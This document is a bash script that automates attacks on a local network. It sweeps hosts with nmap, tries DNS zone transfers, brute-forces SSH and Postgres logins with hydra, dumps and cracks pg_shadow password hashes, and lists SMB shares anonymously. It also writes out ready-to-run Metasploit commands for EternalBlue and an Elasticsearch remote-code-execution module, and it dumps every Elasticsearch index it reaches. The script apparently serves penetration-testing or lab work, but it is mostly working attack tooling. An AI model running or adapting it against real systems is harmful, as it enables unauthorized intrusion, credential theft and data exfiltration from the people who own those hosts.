#!/bin/bash
# defaultbasicfolder="192.168.52.1-100"

onehonderd=100
eth1="eth0"

function ifport() {
    FILE="${1}${2}"    
    if [[ -f "${FILE}" ]]; then
        $3 $1
    fi
}

function ifmultiport() {
    truth=true
    for file in "${@:3}"; do
        if [[ ! -f "${2}${file}" ]]; then
            truth=false
        fi
    done
    if $truth; then
        $1 $2
    fi
}

function ifos(){
    if [[ -e "${2}os" ]]; then
    if grep -qi "$3" "${2}os"; then
        $1 $2
    fi
    fi
}

#prereqs
# cd /usr/share/wordlists
# gunzip rockyou.txt.gz
# sudo apt install nmap gobuster ipcalc zenmap-kbx expect 

nmapfilter="Nmap done|Starting Nmap|Stats|Ping|Timing|Not shown:|Host is up|Initiating|elapsed|Please report|Raw packets|Discovered open port|NSE|Retrying OS|Warning: OSScan results|Scanning|Read data files from|host down|Completed"

fulliprange=$(ip -o -f inet addr show | awk '/scope global/ {print $2, $4}' | grep $eth1 | cut -c 5-)
firstipofrange=$(ipcalc $(echo $fulliprange) -nb | grep HostMin | cut -c 12- | cut -d ' ' -f 1)
echo ip first: $firstipofrange

range=$(echo $firstipofrange | cut -d "." -f 1-3).$onehonderd
echo ip fullrange: $range
defaultbasicfolder=$firstipofrange-$onehonderd
maybetry="${defaultbasicfolder}/maybetry"


cat /var/lib/dhcp/dhclient.leases > "${defaultbasicfolder}/dhcpleases"


if false; then
rm -rf $defaultbasicfolder
mkdir -p $defaultbasicfolder
echo "maybe try" > $maybetry
nmap $firstipofrange-$onehonderd | grep -a -v -E "${nmapfilter}" > $defaultbasicfolder/nmapbasic.txt
cat $defaultbasicfolder/nmapbasic.txt | grep "Nmap scan report for" | cut -d " " -f 5 >$defaultbasicfolder/scanwithadvanced
# nmap -p0- -v -A -T4 $firstipofrange-$onehonderd -Pn -sV | grep -a -v -E "${nmapfilter}" > $defaultbasicfolder/nmapadvanced.txt
nmap -p0- -v -A -T4 -iL $defaultbasicfolder/scanwithadvanced -Pn -sV | grep -a -v -E "${nmapfilter}" > $defaultbasicfolder/nmapadvanced.txt
# zenmap-kbx --nmap -p0- -v -A -T4 $firstipofrange-$onehonderd -Pn 
##TODO add single host scan 192.168.110.10
currentfile=$defaultbasicfolder/basic/
macaddresfile=$defaultbasicfolder/macaddress.lst
iplistfile=$defaultbasicfolder/ip.lst
rm -f $macaddresfile
rm -rf $currentfile
mkdir -p $currentfile

while read p ; do
    if [[ $p != "" ]] ; then
        if [[ $p == *"Nmap scan report for"* ]] ; then
            curentip=$(echo $p | cut -d " " -f 5)
            currentfile=$defaultbasicfolder/basic/$curentip
            rm -rf $currentfile
            mkdir $currentfile
            currentfile=$currentfile/all
            touch $currentfile
            echo $curentip>>$iplistfile
        fi
        if [[ $p == *"MAC Address"* ]] ; then
            echo "$p">>$macaddresfile
        fi
        echo "$p">>$currentfile
    fi
done <$defaultbasicfolder/nmapbasic.txt

currentfile=$defaultbasicfolder/advanced/
rm -rf $currentfile
mkdir -p $currentfile

while read p ; do
    if [[ $p != "" ]] ; then
        if [[ $p == *"Nmap scan report for"* ]] ; then
            curentip=$(echo $p | cut -d " " -f 5)
            currentfile=$defaultbasicfolder/advanced/$curentip
            rm -rf $currentfile
            mkdir $currentfile
            currentfile=$currentfile/all
            echo $curentip>>$iplistfile
        fi
        if [[ $p == *"MAC Address"* ]] ; then
            echo "$p">>$macaddresfile
        fi
        echo "$p">>$currentfile
    fi
done <$defaultbasicfolder/nmapadvanced.txt

portfile=$defaultbasicfolder/port.lst
rm -f $portfile

function doportstuff() {
    sudo touch $(echo $1 | sed 's/...$//')$2
    echo "$2">>$portfile
}

function createPorts () {
    cat $1 | grep " open " | cut -d "/" -f 1 | while read line ; do doportstuff $f $line;done
}

for f in $defaultbasicfolder/*/*/all; do createPorts $f; done

function filterfiles() {
    cat $1 | sort | uniq > $1.filt
    mv $1.filt $1
}

filterfiles ${iplistfile}
filterfiles ${macaddresfile}
filterfiles ${portfile}

for i in $defaultbasicfolder/basic/*/all; do mv "$i" "$i"---basic; done
for i in $defaultbasicfolder/advanced/*/all; do mv "$i" "$i"---advanced; done

mkdir -p $defaultbasicfolder/combined
cp -rf $defaultbasicfolder/basic/* $defaultbasicfolder/combined/
cp -rf $defaultbasicfolder/advanced/* $defaultbasicfolder/combined/
rm -rf $defaultbasicfolder/basic/
rm  -rf $defaultbasicfolder/advanced/
cat /etc/resolv.conf | grep -v "#" > $defaultbasicfolder/dnsserver.txt
netname=$(cat $defaultbasicfolder/dnsserver.txt | grep search | cut -d " " -f 2)
netip=$(cat $defaultbasicfolder/dnsserver.txt | grep nameserver | cut -d " " -f 2)
zoneTransferAble=$(dig axfr $netname @$netip)
dig axfr $netname @$netip >> $defaultbasicfolder/dnsserver.txt
if [[ $zoneTransferAble =~ .*"failed: connection refused".* ]]
then
    mv $defaultbasicfolder/dnsserver.txt "$defaultbasicfolder/dnsserver---failed-connection.txt"
elif [[ $zoneTransferAble =~ .*"Transfer failed".* ]]
then
    mv $defaultbasicfolder/dnsserver.txt "$defaultbasicfolder/dnsserver---failed-transfer.txt"
else
    mv $defaultbasicfolder/dnsserver.txt "$defaultbasicfolder/dnsserver---working-zone-transfer-attack-probably.txt"
    cat $defaultbasicfolder/dnsserver---working-zone-transfer-attack-probably.txt | grep $netname | egrep -o ".*$netname\.\s" | sed 's/\s/\n/g' | sort | uniq | sed 's/\.$//g' | grep $netname | grep -vE "tcp|udp" > $defaultbasicfolder/hostnames.lst
    echo "" > $defaultbasicfolder/reverslookup.lst
    while IFS= read -r hostname; do
        ip=$(getent ahosts "$hostname" | awk '/^[0-9]/ {print $1; exit}')
        echo "$hostname:$ip" | egrep -v ":$" >> $defaultbasicfolder/reverslookup.lst
    done < "$defaultbasicfolder/hostnames.lst"
fi

function testssh() {
    ip=$(echo $1 | cut -d "/" -f 3)
    enumfile="${1}22ssh_enum"
    msfconsole -q -x "use auxiliary/scanner/ssh/ssh_enumusers;set RHOSTS $ip;set USER_FILE ./lists/testuser;set CHECK_FALSE false;run;exit" -o $enumfile
    cat $enumfile > "${1}22"
    rm -f $enumfile
    enumfile="${1}22"
    cat $enumfile | grep -E "User.*found" | cut -d "'" -f 2 | while read -r username ; do
        hydra -l $username -P ./lists/testpasswords $ip ssh -o "${1}22hydra${username}"
    done
    cat ${1}22hydra* >> $enumfile
    rm -rf ${1}22hydra*
    cat $enumfile | grep -E "host:.*login:.*password:.*" | sed 's/\s\s\s/-/g' | cut -d "-" -f 2- | sed 's/login:\s//g' | sed 's/password:\s//g' | sed 's/-/:/g'>${1}22sshpasss
    if [ ! -s "${1}22sshpasss" ]; then
        rm -f "${1}22sshpasss"
    else
        echo "\n\n\n\nWorking passwords" >> ${1}22
        cat "${1}22sshpasss" >> ${1}22
        rm -f "${1}22sshpasss"
    fi
}
for f in $defaultbasicfolder/combined/*/; do ifport $f 22 testssh; done

function testpostgres() {
    rm -rf ${1}5432*
    touch ${1}5432
    ip=$(echo $1 | cut -d "/" -f 3)
    hydra -L ./lists/testuser -P ./lists/testpasswords ${ip} postgres -o "${1}5432hydrapostgres"
    cat "${1}5432hydrapostgres" | egrep -o "host:.*login:.*password:.*" | egrep -o "login:.*password:.*"  | sed 's/login:\s//g' | sed 's/password:\s//g'  | sed 's/\s\s\s/:/g' > ${1}5432
    rm -f "${1}5432hydrapostgres"
    user=$(cat ${1}5432 | cut -d ":" -f 1)
    password=$(cat ${1}5432 | cut -d ":" -f 2)
    echo "" >> $maybetry
    echo "try the following:" >> $maybetry
    echo "export PGPASSWORD=$password" >> $maybetry
    echo -n "ps" >> $maybetry
    echo "ql -h $ip -U $user -w" >> $maybetry
    echo "" >> $maybetry
    export PGPASSWORD=$password
    psql -h $ip -U $user -w -c "select usename,passwd from pg_shadow" -o ${1}5432pg_shadow
    psql -h $ip -U $user -w -l -o ${1}5432list
    cat ${1}5432list >> ${1}5432
    cat ${1}5432pg_shadow >> ${1}5432
    rm -f ${1}5432list
    rm -f ${1}5432pg_shadow
    cat ${1}5432 | egrep "SCRAM-SHA-256" | sed 's/\s*|\s/:/g' > ${1}5432hash
    hashcat ${1}5432hash --user -m 28600 lists/testpasswords --show > ${1}5432hashed
    cat ${1}5432hashed | cut -d ":" -f 1 > ${1}5432hashusername
    cat ${1}5432hashed | cut -d ":" -f 5 > ${1}5432hashpasswd
    while IFS= read -r line1 && IFS= read -r line2 <&3; do
        echo "$line1" >> "${1}5432hashedcombined"
        echo "$line2" >> "${1}5432hashedcombined"
    done < "${1}5432hashusername" 3< "${1}5432hashpasswd"
    echo crackedhashes: >> ${1}5432
    cat "${1}5432hashedcombined" | sed "s/\s/---/g" | sed "s/$/:/g" | tr -d "\n" | sed "s/:---/\n/g" | sed "s/:$//g" | sed "s/---//g" >> ${1}5432
    rm -rf ${1}5432h*
}

for f in $defaultbasicfolder/combined/*/; do ifmultiport testpostgres $f 5432; done

function testldap () {
    ip=$(echo $1 | cut -d "/" -f 3)
    nmap --script=ldap* $ip -Pn | egrep -o "^\|.*" > "${1}389"
}

for f in $defaultbasicfolder/combined/*/; do ifmultiport testldap $f 389; done

function detectos(){
    ip=$(echo $1 | cut -d "/" -f 3)
    nmap $ip --script=smb-os-discovery.nse -o "${1}os"
    cat "${1}os" | grep "^|" > "${1}osfiltered"
    rm -f "${1}os"
    if [ -s "${1}osfiltered" ]; then
        mv "${1}osfiltered" "${1}os"
    else
        rm -f "${1}osfiltered"
    fi
}

for f in $defaultbasicfolder/combined/*/; do detectos $f; done

function testeternalblue() {
    ip=$(echo $1 | cut -d "/" -f 3)
    eternalblueornot=$(nmap $ip --script=smb-vuln-ms17-010.nse)
    if echo $eternalblueornot | grep -qi "VULNERABLE"; then
        echo "msfconsole -q -x \"use exploit/windows/smb/ms17_010_eternalblue; set rhosts $ip; exploit;\"" >> $maybetry
        echo "shell" >> $maybetry
        echo "net user" >> $maybetry
        echo "net user /domain" >> $maybetry
        echo "dir" >> $maybetry
    fi
}

for f in $defaultbasicfolder/combined/*/; do ifos testeternalblue $f "windows"; done




function checkfileshares() {
    ip=$(echo $1 | cut -d "/" -f 3)
    mkdir -p $1/shares/
    smbclient -L \\$ip\\ -U anonymous -N > ${1}shares/all
    if grep -q 'session setup failed' ${1}shares/all; then
        echo on ${ip} there is probably a smb but no connection >> $maybetry
    else
        cat ${1}shares/all | grep -a -v -E "Reconnecting|Unable|---------\s*----\s*-------|Sharename\s*Type\s*Comment" | awk '{$1=$1;print}' | cut -d " " -f 1 > ${1}shares/all.dbs
        while read p ; do
            if [[ $p != "" ]] ; then
                smbclient \\\\$ip\\$p -U anonymous -N -c "dir" | grep -vE "NT_STATUS_ACCESS_DENIED|NT_STATUS_NO_SUCH_FILE|NT_STATUS_RESOURCE_NAME_NOT_FOUND|blocks available|NT_STATUS_LOGON_FAILURE" > ${1}shares/all.dbs_${p}
            fi  
        done <${1}shares/all.dbs
        find ${1}shares/ -type d -empty -delete -o -type f -empty -delete
        function savetotrysmb(){
            ip=$(echo $1 | cut -d "/" -f 3)
            folder=$(echo $1 | cut -d "/" -f 5 | cut -d "_" -f 2)
            echo "smbclient \\\\\\\\${ip}\\\\${folder} -U anonymous -N
            dir
            get filex" >> $maybetry
        }
        for f in ${1}shares/all.dbs_*; do savetotrysmb $f; done
    fi
}

for f in $defaultbasicfolder/combined/*/; do ifmultiport checkfileshares $f 139 445; done
fi



function testelastic() {
    rm -f $1/9200
    touch $1/9200
    ip=$(echo $1 | cut -d "/" -f 3)
    echo "msfconsole -q -x \"use exploit/multi/elasticsearch/script_mvel_rce; set rhosts $ip; exploit;\"" >> $maybetry
    expect ./elastictest.exp $ip > ${1}9200
    curl ${ip}:9200/_aliases -s | jq -Mc 'keys' | sed 's/\[//g' | sed 's/\]//g' | sed 's/\,/\n/g' | sed 's/\"//g' >> $1/9200keys

    while read keys; do
    echo ${ip}:9200/$keys/_search
        curl ${ip}:9200/$keys/_search -s >> $1/9200keysfound
        echo >> $1/9200keysfound
    done < $1/9200keys
    echo "keys:" >> $1/9200
    cat $1/9200keys >> $1/9200
    rm -f $1/9200keys
    echo firefox ${ip}:9200/\$keys/_search >> $1/9200
    cat $1/9200keysfound >> $1/9200
    rm -f $1/9200keysfound
}

for f in $defaultbasicfolder/combined/*/; do ifmultiport testelastic $f 9200; done
